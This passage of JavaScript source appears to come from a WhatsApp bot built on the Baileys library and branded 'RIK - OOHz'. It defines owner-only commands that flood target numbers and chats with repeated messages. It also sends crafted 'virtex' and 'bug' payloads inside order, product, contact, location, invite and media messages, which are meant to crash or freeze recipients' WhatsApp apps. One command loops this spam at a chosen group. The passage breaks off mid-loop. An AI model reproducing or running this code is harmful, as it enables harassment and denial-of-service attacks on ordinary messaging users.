            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
                        await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(`${text}@s.whatsapp.net`, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
case 'colidek' : {
if (!isCreator) throw sticOwner(from)
                    a = await sock.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    m.reply(`BUG COLI DEK`)
                     }
                break
case 'youtube':
		sock.sendMessage(from, { text: "Hai kak saya RIK BOT mau kah kamu mengsubscribe chanel saya\n\nhttps://youtube.com/katanamods", matchedText: 'https://youtube.com/katanamods', description: "", title: "KLIK UNTUK SUBCRIBE", jpegThumbnail: ppuser }, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: invitemas})
		break
case 'virtext':
		sock.sendMessage(from, { text: `${virtex10(prefix)}`, matchedText: `${virtex10(prefix)}`, description: "", title: "KLIK UNTUK VIRTEXT", jpegThumbnail: ppuser }, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: invitemas})
		break
case 'virkos':
		sock.sendMessage(from, { text: `${ngazap(prefix)}`, matchedText: `${ngazap(prefix)}`, description: "", title: "KLIK UNTUK VIRUS KOSONG", jpegThumbnail: ppuser }, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: invitemas})
		break
case 'viremoji':
		sock.sendMessage(from, { text: `${emoji2(prefix)}`, matchedText: `${emoji2(prefix)}`, description: "", title: "KLIK UNTUK VIRUS EMOJI", jpegThumbnail: ppuser }, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: invitemas})
		break
case 'uwih':
if (!isCreator) throw sticOwner(from)
memegnu = (`${virtag(prefix)}`)
sock.send5ButLoc(m.chat, memegnu, `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,)
break
case 'bugghoib': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await sock.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sock.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, m)
}
}
break
case 'inibug': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
let teks = `══✪〘 *BANG INI BUG ?️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
sock.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
//=================================================//
case 'troli2': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
						"orderId": "2887423378068212",
						"jpegThumbnail": fs.readFileSync('./command/Image/rikgans.jpg'),
						"itemCount": 500,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
						"orderTitle": "RIK GANS",
						"sellerJid": "6287741097274@s.whatsapp.net",
						"token": "AR4Ly9KN85K11sPksXetxtC/ETXUQzGquZpw5M0COFWF5A==",
						"totalAmount1000": "50000000",
						"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'bug1': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case 'bug2': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
//=================================================//
case 'bug3': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bug4': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"previewType": "NONE",					
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug5': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bug6': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳",
"matchedText": "https://www.youtube.com/c/katanamods",
"description": "Developer 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bug7': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:sock\nitem1.TEL;waid=6287741097274:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳WhatsApp\nX-WA-BIZ-NAME:sock\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
break
case 'livelokasi': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.308729,
"degreesLongitude": 106.7218048,
"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${virtex10(prefix)}`,
"sequenceNumber": "1658767138853001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokasi': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
						"degreesLatitude": -6.308729157735237,
						"degreesLongitude": 106.72180489473877,
						"caption": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
						"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//=================================================//
case 'buginvite': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"groupName": `MY NAME 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'troli': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./command/Image/pict.jpg'),
"orderTitle": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"sellerJid": "6287741097274@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'catalog': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"description": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"currencyCode": "IDR",
"footerText": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 WE ARE NOT MASTOD`,
"url": "www.instagram.com/ryarllh_01/"
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalogpc': case 'cataloggc':  {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
